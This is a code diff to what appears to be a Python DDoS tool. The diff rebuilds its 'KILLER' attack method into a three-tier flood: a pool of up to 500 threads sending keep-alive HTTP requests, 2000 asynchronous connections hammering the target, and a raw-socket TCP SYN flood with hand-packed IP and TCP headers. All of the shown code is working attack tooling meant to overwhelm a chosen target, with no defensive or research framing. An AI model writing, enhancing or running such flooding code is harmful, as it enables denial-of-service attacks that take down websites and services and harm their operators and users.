@@ -12,8 +12,8 @@ from pathlib import Path
 from re import compile
 from random import choice as randchoice, randint
 from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
-                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
-                    gethostname, socket)
+                    SOCK_RAW, SOCK_STREAM, SO_SNDBUF, TCP_NODELAY, gethostbyname,
+                    gethostname, inet_aton, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
 import ssl
 from struct import pack as data_pack
@@ -37,6 +37,9 @@ from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
 from requests import Response, Session, exceptions, get, cookies
 from yarl import URL
 from base64 import b64encode
+import asyncio
+import os
+from functools import partial
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -94,9 +97,17 @@ tor2webs = [
             's4.tor-gateways.de',
             's5.tor-gateways.de'
         ]
-
 with open(__dir__ / "config.json") as f:
     con = load(f)
+
+# KILLER method configuration
+KILLER_MAX_WORKERS: int = min(500, (os.cpu_count() or 4) * 32)
+KILLER_ASYNC_CONNS: int = 2000
+KILLER_KEEPALIVE_REQS: int = 100
+KILLER_SNDBUF_SIZE: int = 262144
+_killer_pool: ThreadPoolExecutor = ThreadPoolExecutor(
+    max_workers=KILLER_MAX_WORKERS, thread_name_prefix="killer")
+_killer_async_started: bool = False
 
 with socket(AF_INET, SOCK_DGRAM) as s:
     s.connect(("8.8.8.8", 80))
@@ -889,7 +900,7 @@ class HttpFlood(Thread):
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+                                                       target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
         self._payload = (self._defaultpayload +
                          'Accept-Encoding: gzip, deflate, br\r\n'
                          'Accept-Language: en-US,en;q=0.9\r\n'
@@ -902,6 +913,13 @@ class HttpFlood(Thread):
                          'Sec-Gpc: 1\r\n'
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
+        # Pre-computed minimal payload for KILLER (Tier 1: cache payload, skip random headers)
+        self._killer_payload: bytes = str.encode(
+            "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n" % (
+                target.raw_path_qs, self._target.authority
+            ))
+        # Pre-computed full payload for KILLER (with random headers pre-baked)
+        self._killer_full_payload: bytes = self.generate_payload()
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -1055,8 +1073,130 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
-        while True:
-            Thread(target=self.GET, daemon=True).start()
+        global _killer_async_started
+        payload: bytes = self._killer_payload
+
+        # Tier 1: Thread pool with keep-alive workers
+        for _ in range(KILLER_MAX_WORKERS):
+            _killer_pool.submit(self._killer_t1_worker, payload)
+
+        # Tier 2: Async I/O for massive concurrent connections (starts once globally)
+        if not _killer_async_started:
+            _killer_async_started = True
+            Thread(target=self._killer_t2_async_manager, args=(payload,), daemon=True).start()
+
+        # Tier 3: Raw socket flood (if admin privileges and not HTTPS)
+        if self._target.scheme.lower() != "https":
+            try:
+                Thread(target=self._killer_t3_raw_tcp, daemon=True).start()
+            except Exception:
+                pass
+
+        # Block this HttpFlood thread until attack ends (keeps thread alive)
+        self._synevent.wait()
+
+    # ── Tier 1: Thread pool worker with keep-alive connection reuse ──
+    def _killer_t1_worker(self, payload: bytes) -> None:
+        buf_size = KILLER_SNDBUF_SIZE
+        while self._synevent.is_set():
+            try:
+                with self.open_connection() as s:
+                    try:
+                        s.setsockopt(IPPROTO_TCP, SO_SNDBUF, buf_size)
+                    except Exception:
+                        pass
+                    for _ in range(KILLER_KEEPALIVE_REQS):
+                        if not self._synevent.is_set():
+                            break
+                        if not Tools.send(s, payload):
+                            break
+            except Exception:
+                pass
+
+    # ── Tier 2: Async I/O for massive concurrency ──
+    def _killer_t2_async_manager(self, payload: bytes) -> None:
+        try:
+            if os.name == 'nt':
+                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(self._killer_t2_async_flood(payload))
+        except Exception:
+            pass
+        finally:
+            try:
+                loop.close()
+            except Exception:
+                pass
+
+    async def _killer_t2_async_flood(self, payload: bytes) -> None:
+        tasks = []
+        for _ in range(KILLER_ASYNC_CONNS):
+            tasks.append(asyncio.create_task(self._killer_t2_async_worker(payload)))
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def _killer_t2_async_worker(self, payload: bytes) -> None:
+        ssl_ctx = ctx if self._target.scheme.lower() == "https" else None
+        while self._synevent.is_set():
+            try:
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(
+                        self._host,
+                        self._target.port or 80,
+                        ssl=ssl_ctx
+                    ),
+                    timeout=5.0
+                )
+                for _ in range(KILLER_KEEPALIVE_REQS):
+                    if not self._synevent.is_set():
+                        break
+                    writer.write(payload)
+                    await asyncio.wait_for(writer.drain(), timeout=2.0)
+                    global BYTES_SEND, REQUESTS_SENT
+                    BYTES_SEND += len(payload)
+                    REQUESTS_SENT += 1
+                writer.close()
+                await asyncio.wait_for(writer.wait_closed(), timeout=2.0)
+            except Exception:
+                await asyncio.sleep(0.005)
+
+    # ── Tier 3: Raw TCP SYN flood (kernel bypass, requires admin/root) ──
+    def _killer_t3_raw_tcp(self) -> None:
+        target_ip = self._host
+        target_port = self._target.port or 80
+        raw_sock = None
+        try:
+            raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+            raw_sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+            raw_sock.settimeout(0.1)
+        except Exception:
+            return
+        while self._synevent.is_set():
+            try:
+                raw_sock.sendto(self._killer_t3_build_syn(target_ip), (target_ip, 0))
+            except Exception:
+                pass
+
+    def _killer_t3_build_syn(self, dst_ip: str) -> bytes:
+        ip_header = data_pack('!BBHHHBBH4s4s',
+                              0x45, 0, 40,  # version, TOS, total length
+                              0x1234,  # ID
+                              0x4000,  # flags/fragment
+                              64,  # TTL
+                              IPPROTO_TCP,  # protocol
+                              0,  # checksum (filled by kernel if IP_HDRINCL)
+                              inet_aton(__ip__),
+                              inet_aton(dst_ip))
+        tcp_header = data_pack('!HHLLBBHHH',
+                               randint(1024, 65535),  # source port
+                               self._target.port or 80,  # dest port
+                               randint(0, 0xFFFFFFFF),  # seq
+                               randint(0, 0xFFFFFFFF),  # ack
+                               (0x50 | 0x02),  # data offset + SYN flag
+                               0xFF,  # window
+                               0,  # checksum
+                               0)  # urgent pointer
+        return ip_header + tcp_header
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
